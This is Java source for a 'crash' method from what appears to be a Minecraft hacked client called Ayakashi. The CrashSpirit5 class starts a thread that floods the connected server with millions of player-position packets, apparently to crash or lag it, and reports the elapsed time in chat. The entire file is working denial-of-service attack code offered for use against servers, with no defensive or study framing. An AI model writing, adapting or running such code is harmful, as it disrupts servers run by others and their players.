package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C03PacketPlayer;

@CrashInfo(
        name = "spirit5"
)
public class CrashSpirit5 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Spirit method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));

        (new Thread(() -> {
            try {
                for (int i = 0; i < packets; ++i) {
                    double x = Minecraft.getMinecraft().thePlayer.posX;
                    double y = Minecraft.getMinecraft().thePlayer.posY;
                    double z = Minecraft.getMinecraft().thePlayer.posZ;

                    int i2;
                    for (i2 = 0; i2 < 3000; ++i2) {
                        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y + 0.09999999999999D, z, false));
                        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
                    }

                    Minecraft.getMinecraft().thePlayer.motionY = 0.0D;

                    for (i2 = 0; i2 < 10000; ++i2) {
                        double x2 = Minecraft.getMinecraft().thePlayer.posX;
                        double y2 = Minecraft.getMinecraft().thePlayer.posY;
                        double z2 = Minecraft.getMinecraft().thePlayer.posZ;

                        for (int k = 0; k < 3000; ++k) {
                            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x2, y2 + 0.09999999999999D, z2, false));
                            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x2, y2, z2, true));
                        }

                        Minecraft.getMinecraft().thePlayer.motionY = 0.0D;
                    }
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
